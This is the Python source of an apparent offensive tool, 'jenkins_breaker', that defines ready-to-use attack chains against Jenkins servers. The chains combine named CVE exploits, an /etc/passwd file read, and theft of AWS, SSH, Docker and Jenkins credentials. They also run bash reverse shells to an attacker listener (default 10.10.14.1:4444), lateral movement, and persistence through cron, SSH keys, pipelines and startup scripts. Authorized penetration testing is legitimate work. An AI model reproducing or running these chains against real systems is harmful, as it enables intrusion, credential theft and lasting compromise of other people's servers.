"""Predefined exploit chains for common attack scenarios.

Provides ready-to-use attack chains for initial access, full compromise,
stealth reconnaissance, and other offensive scenarios.
"""

from typing import Any, Optional

from jenkins_breaker.chain.engine import ChainStep, create_step
from jenkins_breaker.postex.credentials import extract_credentials
from jenkins_breaker.postex.lateral import perform_lateral_movement
from jenkins_breaker.postex.persistence import install_persistence
from jenkins_breaker.postex.reconnaissance import perform_reconnaissance


def initial_access_chain(lhost: str, lport: int) -> list[ChainStep]:
    """Chain for initial access via file read and credential extraction.

    This chain:
    1. Exploits CVE-2024-23897 for arbitrary file read
    2. Extracts credentials from common paths
    3. Establishes reverse shell

    Args:
        lhost: Listener host for reverse shell
        lport: Listener port

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="file_read",
            name="Arbitrary File Read (CVE-2024-23897)",
            exploit_id="CVE-2024-23897",
            params={"file_path": "/etc/passwd"},
            provides_state=["file_content"],
            on_failure="stop"
        ),
        create_step(
            step_id="extract_creds",
            name="Extract Credentials",
            function=lambda session, state, **kwargs: extract_credentials(),
            depends_on=["file_read"],
            provides_state=["credentials"],
            on_failure="continue"
        ),
        create_step(
            step_id="reverse_shell",
            name="Establish Reverse Shell",
            exploit_id="CVE-2019-1003029",
            params={"lhost": lhost, "lport": lport},
            depends_on=["extract_creds"],
            on_failure="stop"
        )
    ]


def full_compromise_chain(lhost: str, lport: int, ssh_key: Optional[str] = None) -> list[ChainStep]:
    """Chain for full compromise with persistence and lateral movement.

    This chain:
    1. Gains RCE via script security bypass
    2. Performs reconnaissance
    3. Extracts credentials
    4. Installs persistence mechanisms
    5. Attempts lateral movement

    Args:
        lhost: Listener host
        lport: Listener port
        ssh_key: Optional SSH public key for persistence

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="initial_rce",
            name="Initial RCE (CVE-2019-1003029)",
            exploit_id="CVE-2019-1003029",
            params={"command": "id"},
            provides_state=["rce_available"],
            on_failure="stop"
        ),
        create_step(
            step_id="reconnaissance",
            name="System Reconnaissance",
            function=lambda session, state, **kwargs: perform_reconnaissance(session),
            depends_on=["initial_rce"],
            provides_state=["recon_data"],
            on_failure="continue"
        ),
        create_step(
            step_id="credential_extraction",
            name="Extract All Credentials",
            function=lambda session, state, **kwargs: extract_credentials(),
            depends_on=["initial_rce"],
            provides_state=["credentials"],
            on_failure="continue"
        ),
        create_step(
            step_id="reverse_shell",
            name="Establish Reverse Shell",
            function=lambda session, state, lhost, lport, **kwargs: {
                "shell": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            },
            depends_on=["initial_rce"],
            params={"lhost": lhost, "lport": lport},
            provides_state=["shell_established"],
            on_failure="continue"
        ),
        create_step(
            step_id="install_persistence",
            name="Install Persistence",
            function=lambda session, state, **kwargs: install_persistence(
                session,
                f"bash -c 'bash -i >& /dev/tcp/{kwargs.get('lhost')}/{kwargs.get('lport')} 0>&1'",
                ssh_key=kwargs.get('ssh_key')
            ),
            depends_on=["reverse_shell"],
            params={"lhost": lhost, "lport": lport, "ssh_key": ssh_key},
            provides_state=["persistence_installed"],
            on_failure="continue"
        ),
        create_step(
            step_id="lateral_movement",
            name="Attempt Lateral Movement",
            function=lambda session, state, **kwargs: perform_lateral_movement(
                session,
                state.get("credentials", [])
            ),
            depends_on=["credential_extraction"],
            required_state={"credentials": None},
            provides_state=["lateral_targets"],
            on_failure="continue"
        )
    ]


def stealth_reconnaissance_chain() -> list[ChainStep]:
    """Chain for low-impact stealth reconnaissance.

    This chain:
    1. Enumerates Jenkins version and plugins
    2. Lists jobs and nodes
    3. Checks for common misconfigurations
    4. Minimal footprint

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="version_enum",
            name="Enumerate Jenkins Version",
            function=lambda session, state, **kwargs: {
                "version": session.get(f"{session.target}/api/json").json().get("version")
            },
            provides_state=["jenkins_version"],
            on_failure="continue"
        ),
        create_step(
            step_id="plugin_enum",
            name="Enumerate Plugins",
            function=lambda session, state, **kwargs: perform_reconnaissance(session),
            depends_on=["version_enum"],
            provides_state=["plugins"],
            on_failure="continue"
        ),
        create_step(
            step_id="job_enum",
            name="Enumerate Jobs",
            function=lambda session, state, **kwargs: session.get(
                f"{session.target}/api/json?tree=jobs[name,url]"
            ).json(),
            depends_on=["version_enum"],
            provides_state=["jobs"],
            on_failure="continue"
        ),
        create_step(
            step_id="check_anonymous_read",
            name="Check Anonymous Read Access",
            function=lambda session, state, **kwargs: {
                "anonymous_read": session.get(
                    f"{session.target}/api/json",
                    auth=None
                ).status_code == 200
            },
            depends_on=["version_enum"],
            provides_state=["anonymous_access"],
            on_failure="continue"
        )
    ]


def credential_harvesting_chain() -> list[ChainStep]:
    """Chain focused on credential extraction and exfiltration.

    This chain:
    1. Gains RCE
    2. Extracts credentials from all sources
    3. Attempts to decrypt Jenkins credentials
    4. Exfiltrates findings

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="rce",
            name="Gain RCE",
            exploit_id="CVE-2019-1003029",
            params={"command": "whoami"},
            provides_state=["rce_available"],
            on_failure="stop"
        ),
        create_step(
            step_id="extract_aws",
            name="Extract AWS Credentials",
            function=lambda session, state, **kwargs: extract_credentials("~"),
            depends_on=["rce"],
            provides_state=["aws_creds"],
            on_failure="continue"
        ),
        create_step(
            step_id="extract_ssh",
            name="Extract SSH Keys",
            function=lambda session, state, **kwargs: extract_credentials("~"),
            depends_on=["rce"],
            provides_state=["ssh_keys"],
            on_failure="continue"
        ),
        create_step(
            step_id="extract_docker",
            name="Extract Docker Credentials",
            function=lambda session, state, **kwargs: extract_credentials("~"),
            depends_on=["rce"],
            provides_state=["docker_creds"],
            on_failure="continue"
        ),
        create_step(
            step_id="decrypt_jenkins_creds",
            name="Decrypt Jenkins Credentials",
            exploit_id="CVE-2018-1000402",
            depends_on=["rce"],
            provides_state=["jenkins_creds"],
            on_failure="continue"
        )
    ]


def rapid_exploitation_chain(lhost: str, lport: int) -> list[ChainStep]:
    """Chain for rapid exploitation with multiple CVE attempts.

    Tries multiple exploits in parallel and uses first successful one.

    Args:
        lhost: Listener host
        lport: Listener port

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="cve_2024_23897",
            name="Try CVE-2024-23897",
            exploit_id="CVE-2024-23897",
            params={"file_path": "/etc/passwd"},
            on_failure="continue"
        ),
        create_step(
            step_id="cve_2019_1003029",
            name="Try CVE-2019-1003029",
            exploit_id="CVE-2019-1003029",
            params={"command": "id"},
            on_failure="continue"
        ),
        create_step(
            step_id="cve_2018_1000861",
            name="Try CVE-2018-1000861",
            exploit_id="CVE-2018-1000861",
            on_failure="continue"
        ),
        create_step(
            step_id="cve_2019_1003001",
            name="Try CVE-2019-1003001",
            exploit_id="CVE-2019-1003001",
            on_failure="continue"
        ),
        create_step(
            step_id="establish_shell",
            name="Establish Reverse Shell",
            function=lambda session, state, lhost, lport, **kwargs: {
                "command": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            },
            params={"lhost": lhost, "lport": lport},
            on_failure="stop"
        )
    ]


def persistence_only_chain(payload: str, ssh_key: Optional[str] = None) -> list[ChainStep]:
    """Chain focused solely on establishing persistence.

    Args:
        payload: Payload command to persist
        ssh_key: Optional SSH public key

    Returns:
        List of ChainStep objects
    """
    return [
        create_step(
            step_id="cron_persistence",
            name="Install Cron Job",
            function=lambda session, state, payload, **kwargs: install_persistence(
                session, payload, methods=["cron"]
            ),
            params={"payload": payload},
            on_failure="continue"
        ),
        create_step(
            step_id="ssh_persistence",
            name="Install SSH Key",
            function=lambda session, state, payload, ssh_key, **kwargs: install_persistence(
                session, payload, methods=["ssh_key"], ssh_key=ssh_key
            ) if ssh_key else {"skipped": True},
            params={"payload": payload, "ssh_key": ssh_key},
            on_failure="continue"
        ),
        create_step(
            step_id="jenkins_persistence",
            name="Create Jenkins Pipeline",
            function=lambda session, state, payload, **kwargs: install_persistence(
                session, payload, methods=["jenkins_pipeline"]
            ),
            params={"payload": payload},
            on_failure="continue"
        ),
        create_step(
            step_id="startup_persistence",
            name="Modify Startup Script",
            function=lambda session, state, payload, **kwargs: install_persistence(
                session, payload, methods=["startup_script"]
            ),
            params={"payload": payload},
            on_failure="continue"
        )
    ]


def get_chain(chain_name: str, **kwargs: Any) -> Optional[list[ChainStep]]:
    """Get predefined chain by name.

    Args:
        chain_name: Name of chain to retrieve
        **kwargs: Chain-specific parameters

    Returns:
        List of ChainStep objects or None if not found
    """
    chains = {
        "initial_access": lambda: initial_access_chain(
            kwargs.get("lhost", "10.10.14.1"),
            kwargs.get("lport", 4444)
        ),
        "full_compromise": lambda: full_compromise_chain(
            kwargs.get("lhost", "10.10.14.1"),
            kwargs.get("lport", 4444),
            kwargs.get("ssh_key")
        ),
        "stealth_recon": lambda: stealth_reconnaissance_chain(),
        "credential_harvest": lambda: credential_harvesting_chain(),
        "rapid_exploit": lambda: rapid_exploitation_chain(
            kwargs.get("lhost", "10.10.14.1"),
            kwargs.get("lport", 4444)
        ),
        "persistence": lambda: persistence_only_chain(
            kwargs.get("payload", ""),
            kwargs.get("ssh_key")
        )
    }

    if chain_name in chains:
        return chains[chain_name]()
    return None


def list_chains() -> dict[str, str]:
    """List available predefined chains.

    Returns:
        Dictionary mapping chain names to descriptions
    """
    return {
        "initial_access": "Initial access via file read and credential extraction",
        "full_compromise": "Full compromise with persistence and lateral movement",
        "stealth_recon": "Low-impact stealth reconnaissance",
        "credential_harvest": "Focused credential extraction and exfiltration",
        "rapid_exploit": "Rapid exploitation attempting multiple CVEs",
        "persistence": "Establish multiple persistence mechanisms"
    }
